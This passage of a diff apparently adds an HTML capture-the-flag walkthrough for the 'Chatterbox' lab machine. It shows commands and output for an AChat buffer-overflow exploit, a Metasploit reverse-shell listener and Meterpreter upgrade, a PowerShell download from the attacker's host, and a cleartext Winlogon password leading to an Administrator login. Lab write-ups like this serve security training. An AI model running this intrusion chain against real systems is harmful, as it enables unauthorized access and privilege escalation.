+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(<span style="color:#ff0044;font-weight:400">1.0</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;sent&nbsp;=&nbsp;sock.sendto(p[i:(i+<span style="color:#ff0044;font-weight:400">8192</span>)],&nbsp;server_address)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;+=&nbsp;sent<br>
+                sock.close()
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3c) Prep exploit/multi/handler listener</strong></h3><br>
+        Start metasploit and setup an <code>exploit/multi/handler</code> listener to receive our shell.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msfconsole&nbsp;-q</span><br>
+                [...]<br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;payload&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>shell<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br>
+                payload&nbsp;=&gt;&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>shell<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LHOST&nbsp;10.10.14.12<br>
+                LHOST&nbsp;=&gt;&nbsp;10.10.14.12<br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LPORT&nbsp;9001<br>
+                LPORT&nbsp;=&gt;&nbsp;9001<br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>9001&nbsp;<br>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>3d) Run exploit</strong></h3><br>
+        Run the exploit!<br>
+        You should see a callback on your listener.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>achat]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;bof-reversecmd.py&nbsp;</span><br>
+                ----&gt;<span style="color:#ff9d00;font-weight:700">{</span>P00F<span style="color:#ff9d00;font-weight:700">}</span>
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>9001&nbsp;<br>
+                [*]&nbsp;Encoded&nbsp;stage&nbsp;with&nbsp;x86<span style="color:#ff9d00;font-weight:700">/</span>shikata_ga_nai<br>
+                [*]&nbsp;Sending&nbsp;encoded&nbsp;stage&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>267&nbsp;bytes<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;to&nbsp;10.10.10.74<br>
+                [*]&nbsp;Command&nbsp;shell&nbsp;session&nbsp;3&nbsp;opened&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>9001&nbsp;-&gt;&nbsp;10.10.10.74<span style="color:#ff9d00;font-weight:700">:</span>49159<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-10-30&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;+0000<br>
+                <br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7601]<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32&gt;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>3e) Upgrade to meterpreter</strong></h3><br>
+        Meterpreter makes me feel more secure about my shells on windows boxes, so I upgraded to one.<br>
+        <br>
+        Background the current session with <code>Ctrl+Z</code>.<br>
+            <div class="codebox">
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32&gt;^Z<br>
+                Background&nbsp;session&nbsp;3?&nbsp;[y<span style="color:#ff9d00;font-weight:700">/</span>N]&nbsp;&nbsp;y
+            </div>
+        </div><br>
+        <br>
+        Upgrade the session you just backgrounded with <code>sessions -u</code>.<br>
+        The process usually hangs at the <code>[*] Stopping exploit/multi/handler</code> stage, be a little patient, and then try inputting a metasploit command.<br>
+        <br>
+        Connect to your newly upgraded session with <code>sessions -i</code>.<br>
+            <div class="codebox">
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;sessions&nbsp;-u&nbsp;3<br>
+                [*]&nbsp;Executing&nbsp;<span style="color:#3ad900;font-weight:400">'post/multi/manage/shell_to_meterpreter'</span>&nbsp;on&nbsp;session<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;[3]<br>
+                <br>
+                [*]&nbsp;Upgrading&nbsp;session&nbsp;ID<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;3<br>
+                [*]&nbsp;Starting&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>4433&nbsp;<br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>180291&nbsp;bytes<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;to&nbsp;10.10.10.74<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;4&nbsp;opened&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>4433&nbsp;-&gt;&nbsp;10.10.10.74<span style="color:#ff9d00;font-weight:700">:</span>49160<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-10-30&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>50<span style="color:#ff9d00;font-weight:700">:</span>24&nbsp;+0000<br>
+                [*]&nbsp;Stopping&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br>
+                sessions<br>
+                <br>
+                Active&nbsp;sessions<br>
+                ===============<br>
+                <br>
+                &nbsp;&nbsp;Id&nbsp;&nbsp;Name&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connection<br>
+                &nbsp;&nbsp;--&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------<br>
+                &nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell&nbsp;x86<span style="color:#ff9d00;font-weight:700">/</span>windows&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>9001&nbsp;-&gt;&nbsp;10.10.10.74<span style="color:#ff9d00;font-weight:700">:</span>49159&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.74<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meterpreter&nbsp;x86<span style="color:#ff9d00;font-weight:700">/</span>windows&nbsp;&nbsp;CHATTERBOX<span style="color:#333333;font-weight:400">\A</span>lfred&nbsp;@&nbsp;CHATTERBOX&nbsp;&nbsp;10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>4433&nbsp;-&gt;&nbsp;10.10.10.74<span style="color:#ff9d00;font-weight:700">:</span>49160&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.74<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;4<br>
+                [*]&nbsp;Starting&nbsp;interaction&nbsp;with&nbsp;4...<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3f) Grab user.txt</strong></h2><br>
+        Move into a shell and grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                meterpreter&nbsp;&gt;&nbsp;shell<br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>cd&nbsp;Users<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Users<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>type&nbsp;user.txt<br>
+                <span style="color:#ff9d00;font-weight:700">type</span>&nbsp;user.txt<br>
+                72290246dfaedb1e3e3ac9d6fb306334
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to Administrator</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) Cleartext Password in Winlogon Registry Entry</strong></h2><br>
+        Check for cleartext passwords in Windows' AutoLogon registry entry (the password is stored so that the system can log in automtically after boot)<br>
+            <div class="codebox">
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>reg&nbsp;query&nbsp;<span style="color:#3ad900;font-weight:400">"HKLM\SOFTWARE\Microsoft\Windows&nbsp;NT\Currentversion\Winlogon"</span><br>
+                [...]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DisableCAD&nbsp;&nbsp;&nbsp;&nbsp;REG_DWORD&nbsp;&nbsp;&nbsp;&nbsp;0x1<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;scremoveoption&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;0<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ShutdownFlags&nbsp;&nbsp;&nbsp;&nbsp;REG_DWORD&nbsp;&nbsp;&nbsp;&nbsp;0x2b<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DefaultDomainName&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DefaultUserName&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;Alfred<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;AutoAdminLogon&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;1<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DefaultPassword&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;Welcome1<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        We've found a password - <code>Welcome1!</code>.<br>
+        I want to test this passowrd with <code>Administrator</code>, but in Windows it's a little more difficult to priv-esc using credentials.<br>
+        <br>
+        Check the active connections on Chatterbox, and you'll see that 445 is listening locally.<br>
+            <div class="codebox">
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>netstat&nbsp;-ano<br>
+                <br>
+                Active&nbsp;Connections<br>
+                <br>
+                &nbsp;&nbsp;Proto&nbsp;&nbsp;Local&nbsp;Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Foreign&nbsp;Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PID<br>
+                &nbsp;&nbsp;TCP&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>135&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTENING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;736<br>
+                &nbsp;&nbsp;TCP&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTENING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        If we port forward port 445 out to our attacking machine, we can use it to log in using <code>winexe</code> or <code>psexec.py</code>.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>5) 445 Port Forward</strong></h2><br>
+        To port forward, I used <code>plink.exe</code>.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>5a) Transfer plink.exe to target</strong></h3><br>
+        Copy <code>plink.exe</code> to your working directory and serve it to the target machine.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#locate&nbsp;plink.exe</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>windows-resources<span style="color:#ff9d00;font-weight:700">/</span>binaries<span style="color:#ff9d00;font-weight:700">/</span>plink.exe<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/windows-resources/binaries/plink.exe&nbsp;.</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Download it to Alfred's desktop with powershell.<br>
+            <div class="codebox">
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>powershell&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">"(New-Object&nbsp;Net.webClient).downloadFile('http://10.10.14.12:8000/plink.exe',&nbsp;'plink.exe')"</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>5b) Prep for port forward</strong></h3><br>
+        You don't want to create the ssh tunnel over root to your attacking system, that's a bad idea.<br>
+        However, for the port forward to open successfully, it'll need be done via a user with root permissions.<br>
+        <br>
+        Create a new user with a password on your attacking box.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#useradd&nbsp;bob</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#passwd&nbsp;bob</span><br>
+                New&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;heythere<br>
+                Retype&nbsp;new&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;heythere<br>
+                <span style="color:#ff9d00;font-weight:700">passwd:</span>&nbsp;password&nbsp;updated&nbsp;successfully
+            </div>
+        </div><br>
+        <br>
+        Open <code>/etc/passwd</code>.<br>
+        Edit bob's <code>UID</code> and <code>GID</code> to <code>0</code> (root), and change his shell to <code>/bin/false</code> (so that this new root user can't execute commands).<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/passwd</span><br>
+                [...]<br>
+                bob<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">::/</span>home<span style="color:#ff9d00;font-weight:700">/</span>bob<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span>
+            </div>
+        </div><br>
+        <br>
+        You need to allow for root login over ssh so that your new user can log in, so modify your <code>sshd_config</code> file and set <code>PermitRootLogin</code> to <code>yes</code>.<br>
+        Restart the ssh service to have the change come into effect (or start the service if it's not already running).<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/ssh/sshd_config</span><br>
+                [...]<br>
+                PermitRootLogin&nbsp;yes<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#service&nbsp;ssh&nbsp;restart</span>
+            </div>
+        </div><br>
+        <br>
+        At this point, we're ready to port forward port 445 to our attacking system.<br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>5c) Forward port 445</strong></h3><br>
+        <code>plink.exe</code> will cause your shell to hang, so we want to run the command in the background.<br>
+        <br>
+        <code>START /B</code> runs this command in the background (it's the closest equivalent of <code>&amp;</code> in linux)<br>
+        <code>-N</code> tells plink not to start a shell after connecting to the system.<br>
+        <br>
+            <div class="codebox">
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>lfred<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>START&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>B&nbsp;plink.exe&nbsp;-l&nbsp;bob&nbsp;-pw&nbsp;heythere&nbsp;-R&nbsp;445<span style="color:#ff9d00;font-weight:700">:</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;10.10.14.12&nbsp;-N
+            </div>
+        </div><br>
+        <br>
+        You should now see a 445 listening your attacking host.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#netstat&nbsp;-panut&nbsp;|&nbsp;grep&nbsp;445</span><br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;89983<span style="color:#ff9d00;font-weight:700">/</span>sshd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bob@pts&nbsp;<br>
+                tcp6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>1<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:::</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;89983<span style="color:#ff9d00;font-weight:700">/</span>sshd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bob@pts&nbsp;
+            </div>
+        </div><br>
+        <br>
+        If you don't, just try the port forward again, and double check your user setup.<br>
+        If you really can't get it to work, plink to your system as root (but this a pretty unsafe thing to do, avoid if you can).<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>6) Login as Administrator</strong></h2><br>
+        With port 445 open, we can use either <code>winexe</code> or <code>psexec.py</code> to login to the system.<br>
+        <br>
+        <strong>psexec.py</strong><br>
+        <code>psexec.py</code> will give you an <code>NT AUTHORITY/SYSTEM</code> shell, but you'll be unable to read <code>root.txt</code> because of the permissions on the file.<br>
+        <br>
+        <strong>winexe</strong><br>
+        Instead, use <code>winexe</code>, which will net you a <code>CHATTERBOX/Administrator</code> shell.<br>
+        Here you can read <code>root.txt</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#winexe&nbsp;-U&nbsp;Administrator&nbsp;//127.0.0.1&nbsp;"cmd.exe"</span><br>
+                Enter&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Welcome1<span style="color:#ff9d00;font-weight:700">!</span><br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7601]<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                <span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                chatterbox<span style="color:#333333;font-weight:400">\a</span>dministrator<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                <br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>type&nbsp;root.txt<br>
